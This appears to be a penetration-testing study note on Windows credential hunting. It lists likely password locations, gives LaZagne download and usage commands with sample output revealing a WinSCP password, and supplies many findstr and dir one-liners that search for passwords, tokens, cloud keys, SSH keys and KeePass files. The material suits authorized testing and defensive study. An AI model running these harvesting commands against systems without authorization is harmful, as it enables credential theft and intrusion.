---
created: 2026-03-08
tags:
  - Windows
  - Windows_credential_dumping
  - password_attacks
---

### Table of contents


## Windows credential hunting

Things to search for:
- Passwords and passphrases
- Encryption keys
- API keys
- Usernames
- Configuration parameters
- Database credentials

Places you should keep in mind during credential hunting:
- Passwords in Group Policy in the `SYSVOL` share.
- Passwords in scripts in the `SYSVOL` share.
- Password in scripts on IT shares.
- Passwords in `web.config` files on dev machines and IT shares.
- Password in `unattend.xml`.
- Passwords in the AD user or computer description fields
- KeePass databases (if we are able to guess or crack the master password).
- Found on user systems and shares.
- Files with names like `pass.txt`, `passwords.docx`, `passwords.xlsx` found on user systems, shares, and [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration).

Tools useful for automating the process:
- [`LaZagne`](https://github.com/AlessandroZ/LaZagne)

## LaZagne


>**[`LaZagne`](https://github.com/AlessandroZ/LaZagne)** is an open-source post-exploitation tool designed to **retrieve stored credentials from a local system**.

The tool searches for credentials stored by **applications, browsers, databases, operating system components, and configuration files**. It attempts to recover:

- Plaintext passwords
- Stored authentication tokens
- Application credentials
- Browser logins
- Database credentials
- Wi-Fi passwords
- Windows stored credentials

`LaZagne` 

>[!note]+ Installation
>- Pull a `LaZagne` executable to Linux:
>```bash
>wget https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe
>```
>- Then transfer the file to the target system (see [[Linux_file_transfers]] and [[Windows_file_transfers]]).

`LaZagne` uses a modular approach, where each module targets a specific type of credentials. Most modules are designed for Windows, but some work on Linux and macOS.

|Module|Description|
|---|---|
|browsers|Extracts passwords from various browsers including Chromium, Firefox, Microsoft Edge, and Opera|
|chats|Extracts passwords from various chat applications including Skype|
|mails|Searches through mailboxes for passwords including Outlook and Thunderbird|
|memory|Dumps passwords from memory, targeting KeePass and LSASS|
|sysadmin|Extracts passwords from the configuration files of various sysadmin tools like OpenVPN and WinSCP|
|windows|Extracts Windows-specific credentials targeting LSA secrets, Credential Manager, and more|
|wifi|Dumps WiFi credentials|

|Category|Module|Purpose|
|---|---|---|
|Browsers|chrome|Extract Chrome saved credentials|
|Browsers|firefox|Extract Firefox saved passwords|
|Browsers|edge|Extract Microsoft Edge credentials|
|Browsers|ie|Extract Internet Explorer stored passwords|
|System|autologon|Retrieves Windows AutoLogon credentials|
|System|credman|Extract credentials from Windows Credential Manager|
|System|vault|Extract Windows Vault stored credentials|
|System|wifi|Retrieve stored WiFi passwords|
|System|sysadmin|Search configuration files for admin credentials|
|Databases|mssql|Extract SQL Server credentials|
|Databases|mysql|Extract MySQL credentials|
|Databases|postgresql|Extract PostgreSQL credentials|
|Chats|pidgin|Extract Pidgin chat credentials|
|Chats|psi|Extract PSI IM credentials|
|Git|git|Retrieve stored Git credentials|
|SVN|svn|Retrieve Subversion credentials|
|Memory|memorydump|Search process memory for plaintext passwords|
|Linux/Unix|shadow|Extract credentials from shadow files (Linux)|


>[!note] LaZagne supports `35` different browsers on Windows.

- Start all modules:

```powershell
lazagne.exe all
```

- Only extract credentials from browsers:

```poewrshell
lazagne.exe browsers
```

- Display detailed output (verbose mode):

```powershell
lazagne.exe all -v
```

>[!important] The privileges **`LaZagne`** needs depend on **which modules you use** and **what credential storage locations are targeted**. 
>- Most user credentials can be retrieved without administrative access, including credentials from browsers, Git, chat clients, and some database clients, as well as user entries in Windows Credential Manager.
>- Local Administrator is needed for modules that need access to protected system files, such as registry secrets (remember `SeDebugPrivilege`), or credential stores of other users.
>- `LaZagne` doesn't require `SYSTEM` privileges, but it would definitely make life easier.

> [!example]+
> ```powershell
> .\lazagne.exe all
> ```
> 
> ```powershell
> |====================================================================|
> |                                                                    |
> |                        The LaZagne Project                         |
> |                                                                    |
> |                          ! BANG BANG !                             |
> |                                                                    |
> |====================================================================|
> 
> 
> ########## User: bob ##########
> 
> ------------------- Winscp passwords -----------------
> 
> [+] Password found !!!
> URL: 10.129.202.64
> Login: ubuntu
> Password: FSadmin123
> Port: 22
> 
> 
> [+] 1 passwords have been found.
> For more information launch it again with the -v option
> 
> elapsed time = 4.391415596008301
> ```
## Living Off The Land

### `findstr`

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

- Search recursively for common credential keywords:

```powershell
findstr /spin "password pass pwd secret token key credential" *.*
```

- Search common configuration file types:

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.ps1 *.yml
```

- Search for connection strings:

```powershell
findstr /spin "connectionstring" *.*
```

- Search for API keys or tokens:

```powershell
findstr /spin "apikey token bearer" *.*
```

- Search for database credentials:

```powershell
findstr /spin "db_password db_user jdbc" *.*
```

- Search only inside configuration files:

```powershell
findstr /si password *.config *.xml *.ini *.txt
```

- Search for AWS or cloud secrets:

```powershell
findstr /spin "aws secret access_key" *.*
```

- Search for RDP credentials:

```powershell
findstr /spin "TERMSRV" *.*
```

- Search PowerShell scripts for credentials:

```powershell
findstr /si password *.ps1
```

### Hunting credential files

- Search for files with `pass`, `cred`, or `secret` in the name:

```powershell
dir /s /b *pass*
```

```powershell
dir /s /b *cred*
```

```powershell
dir /s /b *secret*
```

- Search for KeePass databases:

```powershell
dir /s /b *.kdbx
```

- Search for configuration files:

```powershell
dir /s /b *.config *.xml *.ini
```

- Search for documents that might contain credentials:

```powershell
dir /s /b *.txt *.docx *.xlsx
```

- Search for SSH keys:

```powershell
dir /s /b id_rsa*
```

- Search for unattended installation files:

```powershell
dir /s /b unattend.xml
```